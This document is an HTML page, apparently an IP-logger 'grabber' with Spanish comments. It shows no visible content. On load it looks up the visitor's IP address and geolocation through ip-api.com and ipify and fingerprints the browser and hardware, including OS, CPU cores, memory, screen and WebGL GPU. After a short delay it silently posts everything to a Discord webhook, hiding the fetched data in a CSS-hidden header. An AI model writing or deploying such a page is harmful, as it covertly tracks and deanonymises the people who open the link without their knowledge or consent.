<html lang="en">

<head>
  <meta charset="UTF-8">

  <!-- Notyf CSS -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
</head>

<body>
  <header class="header"></header>
  <script src="./config.js"></script>
  <script>
    // Función para detectar el sistema operativo
    function detectOS() {
      const userAgent = navigator.userAgent;
      if (userAgent.includes("Windows NT 10.0")) return "Windows 10/11";
      if (userAgent.includes("Windows NT 6.3")) return "Windows 8.1";
      if (userAgent.includes("Windows NT 6.2")) return "Windows 8";
      if (userAgent.includes("Windows NT 6.1")) return "Windows 7";
      if (userAgent.includes("Windows NT 6.0")) return "Windows Vista";
      if (userAgent.includes("Windows NT 5.1")) return "Windows XP";
      if (userAgent.includes("Windows NT 5.0")) return "Windows 2000";
      if (userAgent.includes("Mac")) return "macOS";
      if (userAgent.includes("X11")) return "UNIX";
      if (userAgent.includes("Linux")) return "Linux";
      if (userAgent.includes("Android")) return "Android";
      if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
      return "Unknown OS";
    }

    // Función para detectar el navegador
    function detectBrowser() {
      const userAgent = navigator.userAgent;
      if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Chrome";
      if (userAgent.includes("Firefox")) return "Firefox";
      if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
      if (userAgent.includes("Edg")) return "Edge";
      if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
      if (userAgent.includes("MSIE") || userAgent.includes("Trident")) return "Internet Explorer";
      return "Unknown Browser";
    }

    // Función para obtener información detallada del hardware y sistema
    function getPCInfo() {
      return {
        // Información del navegador
        browser: detectBrowser(),
        browserVersion: navigator.appVersion,
        userAgent: navigator.userAgent,

        // Información del sistema operativo
        operatingSystem: detectOS(),
        platform: navigator.platform,

        // Información de hardware
        cpuCores: navigator.hardwareConcurrency || "No disponible",
        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "No disponible",
        maxTouchPoints: navigator.maxTouchPoints || 0,

        // Información de pantalla
        screenResolution: `${screen.width}x${screen.height}`,
        availableResolution: `${screen.availWidth}x${screen.availHeight}`,
        colorDepth: screen.colorDepth + " bits",
        pixelDepth: screen.pixelDepth + " bits",
        screenOrientation: screen.orientation ? screen.orientation.type : "No disponible",

        // Información de idioma y zona horaria
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,

        // Información de conexión (si está disponible)
        connection: navigator.connection ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink + " Mbps",
          rtt: navigator.connection.rtt + " ms",
          saveData: navigator.connection.saveData
        } : "No disponible",

        // Información de cookies y almacenamiento
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || "No especificado",

        // Información de Java y plugins
        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
        plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "No disponibles",

        // Información de GPU
        webGL: (function () {
          try {
            const canvas = document.createElement("canvas");
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (gl) {
              const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
              return debugInfo ? {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
              } : "WebGL disponible pero sin info detallada";
            }
            return "WebGL no disponible";
          } catch (e) {
            return "Error al detectar WebGL";
          }
        })(),

        // Información de batería (si está disponible)
        battery: (function () {
          if ('getBattery' in navigator) {
            return "Batería API disponible";
          }
          return "Batería API no disponible";
        })(),

        // Información de fecha y hora
        localTime: new Date().toString(),
        timezoneOffset: new Date().getTimezoneOffset(),

        // Información de rendimiento
        devicePixelRatio: window.devicePixelRatio || 1,
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
      };
    }

    function get_information(link, callback) {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", link, true);
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          callback(xhr.responseText);
        }
      };
      xhr.send(null);
    }

    async function ipLogByRaz() {
      var ispp = document.getElementById('ipppp').innerHTML;
      var extra = document.getElementById("razzylog").innerHTML;

      // Obtener información detallada de la PC
      const pcInfo = getPCInfo();

      const request = new XMLHttpRequest();
      request.open("POST", wbhk);
      request.setRequestHeader('Content-type', 'application/json');

      // Formatear la información para Discord
      const pcInfoText = `
**🖥️ INFORMACIÓN DEL SISTEMA:**
**Sistema Operativo:** ${pcInfo.operatingSystem}
**Plataforma:** ${pcInfo.platform}
**Navegador:** ${pcInfo.browser}
**CPU Cores:** ${pcInfo.cpuCores}
**RAM:** ${pcInfo.deviceMemory}
**Resolución:** ${pcInfo.screenResolution}
**Color Depth:** ${pcInfo.colorDepth}

**🌐 INFORMACIÓN DEL NAVEGADOR:**
**User Agent:** ${pcInfo.userAgent}
**Idioma:** ${pcInfo.language}
**Idiomas Disponibles:** ${pcInfo.languages}
**Zona Horaria:** ${pcInfo.timezone}
**Cookies:** ${pcInfo.cookiesEnabled ? "Habilitadas" : "Deshabilitadas"}
**Java:** ${pcInfo.javaEnabled ? "Habilitado" : "Deshabilitado"}

**⚡ HARDWARE ADICIONAL:**
**Touch Points:** ${pcInfo.maxTouchPoints}
**Pixel Ratio:** ${pcInfo.devicePixelRatio}
**Touch Support:** ${pcInfo.touchSupport ? "Sí" : "No"}
**WebGL:** ${typeof pcInfo.webGL === 'object' ?
          `Vendor: ${pcInfo.webGL.vendor}, Renderer: ${pcInfo.webGL.renderer}` :
          pcInfo.webGL}

**🕐 INFORMACIÓN TEMPORAL:**
**Hora Local:** ${pcInfo.localTime}
        `.trim();

      const params = {
        username: "Lammers",
        avatar_url: 'https://i.pinimg.com/736x/81/31/7a/81317ad161ed2f05bb841aab0902a58c.jpg',
        content: `**🌐 INFORMACIÓN DE IP:**\n**IP:** _${ispp}_\n**Raw IP Info:** _https://api.techniknews.net/ipgeo/${ispp}_\n\n${pcInfoText}\n\n**📍 INFORMACIÓN GEOGRÁFICA:**\n\`\`\`${extra}\`\`\``
      };

      request.send(JSON.stringify(params));
    }

    // Obtener información de IP y geolocalización
    get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (text) {
      var div = document.createElement("div");
      div.innerHTML = text;
      div.id = "razzylog";
      const secondList = document.getElementsByClassName("header")[0];
      secondList.appendChild(div);
    });

    get_information("https://api.ipify.org/", function (text) {
      var div = document.createElement("div");
      div.innerHTML = text;
      div.id = "ipppp";
      const secondList = document.getElementsByClassName("header")[0];
      secondList.appendChild(div);
    });

    // Ejecutar después de un tiempo
    setTimeout(function () {
      ipLogByRaz();
    }, 1500);
  </script>
  <style>
    .header {
      display: none;
    }

    .map-container {
      display: none;
    }
  </style>
</body>
